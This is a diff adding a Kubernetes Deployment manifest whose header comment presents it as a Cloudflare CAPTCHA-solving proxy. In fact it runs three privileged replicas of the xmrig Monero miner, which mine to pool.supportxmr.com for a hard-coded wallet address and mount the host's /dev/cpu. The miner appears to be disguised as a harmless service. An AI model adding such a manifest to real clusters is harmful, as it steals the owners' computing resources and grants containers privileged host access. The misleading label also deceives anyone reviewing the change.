@@ -1,0 +1,63 @@
+## This is a proxy that solves Cloudflare's CAPTCHA challenge for automated services
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: xmrig
+  labels:
+    app.kubernetes.io/name: xmrig
+  annotations:
+    polaris.fairwinds.com/tagNotSpecified-exempt: true  # Latest tag is desired here
+spec:
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: xmrig
+  replicas: 3
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: xmrig
+    spec:
+      affinity:
+          requiredDuringSchedulingIgnoredDuringExecution:
+            - labelSelector:
+                matchExpressions:
+                  - key: app.kubernetes.io/name
+                    operator: In
+                    values: ["xmrig"]
+              topologyKey: kubernetes.io/hostname
+      containers:
+        - name: xmrig
+          image: miningcontainers/xmrig:latest
+          args:
+            - "-p"
+            - "$(POD_NAME)"
+            - "-k"
+            - "--tls"
+            - "-o"
+            - "pool.supportxmr.com:443"
+            - "-u"
+            - "8B8AB3jeWm1ZpCrAJLDqqoN1nMo5BJssK7vSW5ntuYqU19CB8NnDZ4ZUq4MdZo7nn1CEXmSa2jUx4cwsSCXmL2gd3iTva9c"
+            - "-t"
+            - "2"
+            - "--randomx-1gb-pages"
+          env:
+            - name: POD_NAME
+              valueFrom:
+                fieldRef:
+                  fieldPath: metadata.name
+          securityContext:
+            privileged: true
+            allowPrivilegeEscalation: true
+          volumeMounts:
+            - name: msr-dev
+              mountPath: /dev/cpu
+          resources:
+            limits:
+              memory: "4Gi"
+              cpu: "4"
+      volumes:
+        - name: msr-dev
+          hostPath:
+            path: /dev/cpu
+            type: Directory
